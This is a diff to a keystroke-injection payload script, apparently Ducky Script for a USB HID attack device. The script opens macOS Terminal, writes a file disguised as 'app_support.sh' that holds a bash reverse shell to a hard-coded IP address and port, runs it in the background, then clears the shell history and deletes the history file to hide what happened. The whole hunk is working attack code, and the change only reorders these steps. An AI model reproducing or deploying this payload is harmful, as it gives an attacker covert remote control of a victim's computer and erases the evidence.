@@ -17,15 +17,25 @@ function onKeyboardUp()
                 STRING terminal.app
                 DELAY 200
                 ENTER
-                DELAY 1500
-                STRING echo "#\!/bin/bash" > ~/app_support.sh && echo "bash -i >& /dev/tcp/206.189.215.73/3456 0>&1" >> ~/app_support.sh && chmod a+x ~/app_support.sh
-                DELAY 900
+                DELAY 1000
                 ENTER
                 DELAY 200
-                STRING cd ~/ && ~/app_support.sh &; history -c && rm ~/.bash_history && disown && exit
+                STRING echo "#\!/bin/bash" > ~/app_support.sh && echo "bash -i >& /dev/tcp/206.189.215.73/3456 0>&1" >> ~/app_support.sh && chmod a+x ~/app_support.sh
+                DELAY 1000
+                ENTER
+                DELAY 200
+                STRING cd ~/ && ./app_support.sh & disown && exit
                 DELAY 500
                 ENTER
-                DELAY 1000
+                DELAY 200
+                STRING history -c && rm -f ~/.bash_history
+                DELAY 500
+                ENTER
+                DELAY 200
+                STRING disown && exit
+                DELAY 500
+                ENTER
+                DELAY 200
                 GUI q
 
         EOF
